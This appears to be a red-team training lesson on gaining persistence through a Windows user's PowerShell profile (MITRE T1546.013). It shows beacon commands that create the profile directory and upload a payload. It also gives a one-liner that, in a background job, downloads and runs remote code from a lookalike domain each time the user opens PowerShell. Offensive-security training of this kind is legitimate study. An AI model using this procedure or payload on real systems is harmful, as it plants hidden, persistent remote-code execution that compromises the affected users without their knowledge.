A PowerShell profile, `profile.ps1`, is a script that executes when new PowerShell windows are opened by a user.  Developers often use these to customise the appearance and behaviour of their PowerShell sessions.  An adversary can create or modify the profile of a user to execute malicious code [T1546.013](https://attack.mitre.org/techniques/T1546/013/)


Microsoft publishes details on where these profiles can be created for both [PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-5.1) and [PowerShell Core](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-7.4).  For example, `$HOME\Documents\WindowsPowerShell\Profile.ps1`.

If the profile and/or directory doesn't exist, just create it.

```powershell
ls C:\Users\pchilds\Documents

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     12/22/2024 16:47:10   My Music
          dir     12/22/2024 16:47:10   My Pictures
          dir     12/22/2024 16:47:10   My Videos
 402b     fil     12/22/2024 16:47:22   desktop.ini
 
beacon> mkdir C:\Users\pchilds\Documents\WindowsPowerShell
beacon> cd C:\Users\pchilds\Documents\WindowsPowerShell
```

It's important not to put any code into the profile that will block because the user will not be presented with an input prompt until the profile script has finished executing.  Some workarounds include executing the payload via the [Start-Job](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/start-job?view=powershell-5.1) cmdlet.

For example:

```powershell
$_ = Start-Job -ScriptBlock { iex (new-object net.webclient).downloadstring("http://bleepincomputer.com/a") }
```

Then upload the profile to the user's WindowsPowerShell directory.

```powershell
beacon> upload C:\Payloads\Profile.ps1
```